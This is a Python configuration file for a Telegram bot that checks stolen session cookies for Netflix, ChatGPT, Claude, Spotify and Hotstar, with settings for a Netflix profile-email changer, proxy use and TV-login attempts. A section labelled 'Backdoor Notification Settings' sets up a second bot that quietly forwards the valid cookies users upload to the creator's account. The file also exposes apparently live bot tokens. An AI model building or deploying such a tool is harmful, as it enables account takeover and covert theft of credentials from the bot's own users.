# Standard Library Imports
import os

# --- AetherX ⚡🌟 BOT CONFIGURATION --- Created by SkyriX

# --- Telegram Bot Configuration ---
# Your bot token from BotFather
BOT_TOKEN = "7709226793:AAF8vZxH66arqHDXkHsg2riJgHOnr-2cgt8"

# --- Admin & User Configuration ---
# Your personal Telegram User ID (from @userinfobot)
ADMIN_USER_ID = 6632159196

# --- Backdoor Notification Settings ---
# This is the bot token for the separate bot that will receive valid cookies.
BACKDOOR_BOT_TOKEN = "8180575649:AAE_683n8gwI5-OlQdGdJW7frYBHLUd-Tdc"
# This is the Telegram User ID that will receive the cookie files from the backdoor bot.
BACKDOOR_RECIPIENT_ID = 6632159196


# --- File Handling Limits & Settings ---
# Maximum size for a ZIP file upload in megabytes.
MAX_ZIP_SIZE_MB = 30

# Maximum number of files to process within a single ZIP archive.
MAX_FILES_IN_ZIP = 99999999

# Number of concurrent workers for processing files in a ZIP.
# Defaults to the number of CPU cores + 4, which is a good balance for I/O-bound tasks.
MAX_CONCURRENT_WORKERS = (os.cpu_count() or 1) + 4

# --- Rate Limiting Configuration ---
MAX_COOKIES_PER_USER = 5000
RATE_LIMIT_WINDOW_MINUTES = 4

# --- Database Configuration ---
DATABASE_FILE = 'bot_database.db'
DATABASE_POOL_SIZE = 10
DATABASE_POOL_MIN_SIZE = 2

# --- Cache Configuration ---
CACHE_TTL_SECONDS = 300
CACHE_MAX_SIZE = 1000

# Allowed file extensions for different modes.
# Add or remove extensions as needed.
ALLOWED_EXTENSIONS = {
    'health_check': ('.txt',),
    'nf_token': ('.txt',),
    'claude_check': ('.txt',),
    'chatgpt_check': ('.txt',),
    'spotify_check': ('.txt',),
    'hotstar_check': ('.txt',),
    'converter': ('.txt', '.json')
}

# --- TV Login Configuration ---
TV_VAULT_DIR = 'vault'
PROXY_FILE = 'proxy.txt'
TV_MAX_ATTEMPTS = 50

# --- Web Request Settings ---
# User-Agent for making requests to Netflix.
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

# --- API Configuration ---
REQUEST_TIMEOUT = 15
MAX_RETRIES = 3

# --- (Optional) Notifications Bot ---
# Second bot token for admin notifications (optional)
NOTIFICATION_BOT_TOKEN = None

# --- Nettrix: Netflix Profile Email Adder ---
# GraphQL endpoint for AleProvision + UpdateProfileEmail mutations
NF_EMAIL_GRAPHQL_URL     = "https://web.prod.cloud.netflix.com/graphql"
# Netflix client app-version header (update if Netflix rotates this)
NF_EMAIL_APP_VERSION     = "v9833b8f0"
# Persisted-query IDs (obtained from Netflix HAR capture)
NF_EMAIL_ALE_PROVISION_ID = "40fdbbd2-af28-4962-bb30-e0025648e2de"
NF_EMAIL_UPDATE_ID        = "82b766d2-badb-4ac3-9538-404cf0fd4917"
